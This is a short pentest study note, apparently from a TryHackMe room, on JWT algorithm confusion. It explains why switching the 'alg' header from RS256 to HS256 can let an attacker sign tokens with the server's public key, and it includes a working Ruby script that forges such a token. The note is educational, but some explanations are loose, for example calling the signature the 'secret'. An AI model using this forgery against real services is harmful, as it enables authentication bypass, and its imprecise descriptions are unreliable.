# JWT
#pentest/tryhackme

## What
Json Web Token's are a fairly interesting case, as it isn't a vulnerability itself. In fact, it's a fairly popular, and if done right very secure method of authentication. The basic structure of a JWT is this, it goes "header.payload.secret", the secret is only known to the server, and is used to make sure that data wasn't changed along the way. Everything is then base64 encoded. so an example JWT token would look like:
`"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`

Meaning that if we are able to control the secret, we can effectively control the data. To be able to do this we have to understand how the secret is calculated. This requires knowing the structure of the header, a typical JWT header looks like this `{"typ":"JWT","alg":"RS256"}`.

 We're interested in the alg field. RS256 uses a private RSA key that's only available to the server, so that's not vulnerable. However, We can change that field to HS256, This is calculated using the server's *public*key, which in certain circumstances we may have access to.

## Playing with JWT
* [JSON Web Tokens - jwt.io](https://jwt.io/)
* [JSON Web Token (JWT)](https://www.jsonwebtoken.io/)

## Payloads
[PayloadsAllTheThings/JSON Web Token at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

## Example of exploit using the public key
It's not really an exploit and more of an algorithm, the algorithm `HS256`  means that the secret is calculated using the server `public key`, which in certain circumstances we may have access to.

```rb
require 'openssl'
require 'base64'
require 'json'

HMAC_SECRET = <<~DESC
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF
NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c
1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+
H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f
ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw
2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF
KwIDAQAB
-----END PUBLIC KEY-----
DESC

def encode(hash_content)
  Base64.encode64(
    JSON.generate(hash_content)
  ).tr('+/', '-_').gsub(/[\n=]/, '')
end

def encode_signature(message)
  digest = OpenSSL::Digest.new('sha256')
  signature = OpenSSL::HMAC.digest(digest, HMAC_SECRET, message)
  Base64.encode64(signature).tr('+/', '-_').gsub(/[\n=]/, '')
end

def jwt(header, payload_hash)
  encoded_header = encode(header)
  encoded_payload = encode(payload_hash)
  encoded_signature = encode_signature(
    [encoded_header, encoded_payload].join('.')
  )

  [encoded_header, encoded_payload, encoded_signature].join('.')
end

puts jwt(
  { typ: 'JWT', alg: 'HS256'},
  { iss: "Paradox", iat: 1592187870, exp: 1592187990, data: { pingu: "noots" } }
)

```
